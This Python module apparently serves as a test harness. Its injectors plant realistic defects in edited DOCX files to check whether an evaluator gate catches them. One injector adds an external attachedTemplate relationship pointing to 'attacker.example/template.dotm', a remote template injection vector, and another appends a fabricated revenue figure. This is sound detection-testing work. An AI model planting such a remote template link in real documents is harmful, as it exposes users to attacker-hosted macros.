"""Known-regression injectors used to measure evaluator detection rates.

Each injector takes a correctly edited output DOCX and introduces one
specific, realistic defect outside the approved edit. ``expected`` is the
minimum decision the delivery gate must reach.
"""

from __future__ import annotations

import io
import zipfile
from collections.abc import Callable
from dataclasses import dataclass

from lxml import etree

from app.document.document_models import DocumentIndex
from app.document.docx_parser import DocxPackage, element_path, iter_paragraphs, serialize_xml
from app.document.ooxml import A_NS, w


@dataclass(frozen=True)
class Regression:
    regression_id: str
    description: str
    expected: str  # "FAIL" or "REVIEW_REQUIRED" (minimum severity)
    visual_detectable: bool  # whether a renderer-only check can be expected to see it
    apply: Callable[[bytes, DocumentIndex, set[str]], bytes | None]


def _target_paragraph(pkg: DocxPackage, index: DocumentIndex, edited: set[str], *, last: bool = True):
    candidates = [
        b
        for b in index.blocks
        if b.location_id not in edited
        and b.part == index.main_part
        and b.editable
        and len(b.text.strip()) > 12
        and b.container.value == "body"
    ]
    if not candidates:
        return None, None
    blk = candidates[-1] if last else candidates[0]
    root = pkg.xml(blk.part)
    for p, _, _ in iter_paragraphs(root):
        if element_path(p) == blk.path:
            return blk, p
    return None, None


def _get_or_add(parent, tag: str):
    found = parent.find(w(tag))
    return found if found is not None else etree.SubElement(parent, w(tag))


def _write(pkg: DocxPackage, parts: set[str]) -> bytes:
    return pkg.write({p: serialize_xml(pkg.xml(p)) for p in parts})


def _first_run_rpr(p):
    run = next((r for r in p.iter(w("r")) if (r.findtext(w("t")) or "").strip()), None)
    if run is None:
        return None
    rpr = run.find(w("rPr"))
    if rpr is None:
        rpr = etree.Element(w("rPr"))
        run.insert(0, rpr)
    return rpr


def font_size_change(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    for run in p.iter(w("r")):
        rpr = run.find(w("rPr"))
        if rpr is None:
            rpr = etree.Element(w("rPr"))
            run.insert(0, rpr)
        sz = _get_or_add(rpr, "sz")
        sz.set(w("val"), "30")
    return _write(pkg, {blk.part})


def unedited_text_change(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    t = next((t for t in p.iter(w("t")) if (t.text or "").strip()), None)
    if t is None or t.text is None:
        return None
    t.text = t.text.replace(t.text.strip().split()[0], "Spearheaded", 1)
    return _write(pkg, {blk.part})


def numeric_fabrication(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    t = [t for t in p.iter(w("t")) if (t.text or "").strip()][-1]
    t.text = t.text.rstrip(".") + ", improving revenue by 40%."
    return _write(pkg, {blk.part})


def remove_bold(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    root = pkg.xml(index.main_part)
    for b in root.iter(w("b")):
        p = next(b.iterancestors(w("p")), None)
        if p is None:
            continue
        loc = next((blk for blk in index.blocks if blk.part == index.main_part and blk.path == element_path(p)), None)
        if loc is not None and loc.location_id in edited:
            continue
        b.getparent().remove(b)
        return _write(pkg, {index.main_part})
    return None


def color_change(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    rpr = _first_run_rpr(p)
    color = _get_or_add(rpr, "color")
    color.set(w("val"), "2E75B6")
    return _write(pkg, {blk.part})


def paragraph_spacing(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited, last=False)
    if p is None:
        return None
    ppr = p.find(w("pPr"))
    if ppr is None:
        ppr = etree.Element(w("pPr"))
        p.insert(0, ppr)
    sp = _get_or_add(ppr, "spacing")
    sp.set(w("before"), "480")
    return _write(pkg, {blk.part})


def margin_change(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    root = pkg.xml(index.main_part)
    mar = next(root.iter(w("pgMar")), None)
    if mar is None:
        return None
    mar.set(w("left"), str(int(mar.get(w("left"), "1440")) + 720))
    return _write(pkg, {index.main_part})


def page_break_inserted(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited, last=False)
    if p is None:
        return None
    run = etree.Element(w("r"))
    br = etree.SubElement(run, w("br"))
    br.set(w("type"), "page")
    ppr = p.find(w("pPr"))
    p.insert(1 if ppr is not None else 0, run)
    return _write(pkg, {blk.part})


def image_removed(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    root = pkg.xml(index.main_part)
    blip = next(root.iter(f"{{{A_NS}}}blip"), None)
    if blip is None:
        return None
    run = next(blip.iterancestors(w("r")))
    run.getparent().remove(run)
    return _write(pkg, {index.main_part})


def table_width_change(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    root = pkg.xml(index.main_part)
    grid = next(root.iter(w("gridCol")), None)
    if grid is None:
        return None
    grid.set(w("w"), str(max(600, int(grid.get(w("w"), "2000")) // 2)))
    for tc in root.iter(w("tcW")):
        tc.set(w("w"), str(max(600, int(tc.get(w("w"), "2000")) // 2)))
        break
    return _write(pkg, {index.main_part})


def paragraph_duplicated(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    import copy

    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    p.addnext(copy.deepcopy(p))
    return _write(pkg, {blk.part})


def character_spacing(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    rpr = _first_run_rpr(p)
    sp = _get_or_add(rpr, "spacing")
    sp.set(w("val"), "40")
    return _write(pkg, {blk.part})


def highlight_added(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    """Pixel-only change: glyph positions and colours are unchanged."""
    pkg = DocxPackage(data)
    blk, p = _target_paragraph(pkg, index, edited)
    if p is None:
        return None
    rpr = _first_run_rpr(p)
    _get_or_add(rpr, "highlight").set(w("val"), "yellow")
    return _write(pkg, {blk.part})


def cell_shading_added(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    """Pixel-only change: background fill on a table cell."""
    pkg = DocxPackage(data)
    root = pkg.xml(index.main_part)
    tc = next(root.iter(w("tc")), None)
    if tc is None:
        return None
    tcpr = tc.find(w("tcPr"))
    if tcpr is None:
        tcpr = etree.Element(w("tcPr"))
        tc.insert(0, tcpr)
    shd = _get_or_add(tcpr, "shd")
    shd.set(w("val"), "clear")
    shd.set(w("color"), "auto")
    shd.set(w("fill"), "D9E2F3")
    return _write(pkg, {index.main_part})


def image_content_changed(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    """Pixel-only change: image bytes replaced by a same-sized, different picture."""
    from PIL import Image, ImageDraw

    pkg = DocxPackage(data)
    media = sorted(n for n in pkg.members if n.startswith("word/media/") and n.endswith(".png"))
    if not media:
        return None
    original = Image.open(io.BytesIO(pkg.members[media[0]]))
    replacement = Image.new("RGB", original.size, (255, 255, 255))
    ImageDraw.Draw(replacement).rectangle([0, 0, original.size[0] // 2, original.size[1]], fill=(20, 140, 60))
    buf = io.BytesIO()
    replacement.save(buf, format="PNG")
    return pkg.write({media[0]: buf.getvalue()})


def truncated_package(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    return data[: len(data) // 2]


def external_relationship_added(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    rels_name = "word/_rels/document.xml.rels"
    root = etree.fromstring(pkg.members[rels_name])
    rel = etree.SubElement(root, "{http://schemas.openxmlformats.org/package/2006/relationships}Relationship")
    rel.set("Id", "rIdEvil")
    rel.set("Type", "http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate")
    rel.set("Target", "https://attacker.example/template.dotm")
    rel.set("TargetMode", "External")
    return pkg.write({rels_name: serialize_xml(root)})


def unrelated_part_changed(data: bytes, index: DocumentIndex, edited: set[str]) -> bytes | None:
    pkg = DocxPackage(data)
    name = "docProps/core.xml" if "docProps/core.xml" in pkg.members else None
    if name is None:
        return None
    root = pkg.xml(name)
    for el in root.iter():
        if isinstance(el.tag, str) and el.tag.endswith("}title"):
            el.text = "changed"
            break
    else:
        etree.SubElement(root, "{http://purl.org/dc/elements/1.1/}title").text = "changed"
    return pkg.write({name: serialize_xml(root)})


REGRESSIONS: list[Regression] = [
    Regression("font_size_change", "Font size of an unedited paragraph enlarged", "FAIL", True, font_size_change),
    Regression("unedited_text_change", "Text of an unedited paragraph changed", "FAIL", True, unedited_text_change),
    Regression("numeric_fabrication", "Unapproved metric appended to an unedited paragraph", "FAIL", True, numeric_fabrication),
    Regression("remove_bold", "Bold removed from an unedited run", "FAIL", True, remove_bold),
    Regression("color_change", "Text colour of an unedited run changed", "FAIL", True, color_change),
    Regression("paragraph_spacing", "Space-before added to an unedited paragraph", "FAIL", True, paragraph_spacing),
    Regression("margin_change", "Left page margin widened", "FAIL", True, margin_change),
    Regression("page_break_inserted", "Page break inserted into an unedited paragraph", "FAIL", True, page_break_inserted),
    Regression("image_removed", "An image was removed", "FAIL", True, image_removed),
    Regression("table_width_change", "Table column width halved", "FAIL", True, table_width_change),
    Regression("paragraph_duplicated", "An unedited paragraph was duplicated", "FAIL", True, paragraph_duplicated),
    Regression("character_spacing", "Letter spacing expanded on an unedited run", "FAIL", True, character_spacing),
    Regression("highlight_added", "Yellow highlight added to an unedited run (pixel-only)", "FAIL", True, highlight_added),
    Regression("cell_shading_added", "Background shading added to a table cell (pixel-only)", "FAIL", True, cell_shading_added),
    Regression(
        "image_content_changed", "Image replaced by a same-sized different picture (pixel-only)", "FAIL", True, image_content_changed
    ),
    Regression("truncated_package", "Output package truncated (corrupt ZIP)", "FAIL", False, truncated_package),
    Regression("external_relationship_added", "External template relationship added", "FAIL", False, external_relationship_added),
    Regression("unrelated_part_changed", "Unrelated package part (core properties) modified", "FAIL", False, unrelated_part_changed),
]


def is_zip(data: bytes) -> bool:
    try:
        with zipfile.ZipFile(io.BytesIO(data)) as zf:
            return zf.testzip() is None
    except zipfile.BadZipFile:
        return False
